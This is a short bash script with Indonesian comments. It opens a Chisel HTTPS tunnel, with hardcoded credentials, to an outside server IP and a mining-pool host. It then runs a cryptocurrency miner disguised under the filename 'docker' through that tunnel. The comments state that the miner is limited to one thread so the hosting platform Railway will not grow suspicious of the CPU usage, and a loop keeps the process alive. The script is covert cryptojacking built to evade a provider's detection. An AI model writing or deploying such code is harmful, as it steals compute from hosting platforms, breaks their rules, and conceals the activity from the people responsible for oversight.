#!/bin/bash

# --- KONFIGURASI ---
IP_UBUNTU="45.115.224.184"

echo "Membuka The Ghost Tunnel (Chisel HTTPS )..."

# Jalankan Chisel Client
./chisel client --tls-skip-verify --auth "mineruser:minerpass123" https://$IP_UBUNTU:443 4629:dagnam.xyz:4629 > chisel.log 2>&1 &

# Tunggu 15 detik agar tunnel benar-benar stabil
sleep 15

echo "--- Status Koneksi ---"
cat chisel.log
echo "----------------------"

echo "Menjalankan Miner via Ghost Tunnel..."
# Miner menyambung ke localhost:4629
# -t 1 sangat disarankan agar Railway tidak curiga dengan penggunaan CPU
./docker -c docker.json -o stratum+tcp://127.0.0.1:4629 -t 1  >/dev/null 2>&1 &

echo "Jalan Kali..."

while true
do
  sleep 60
done
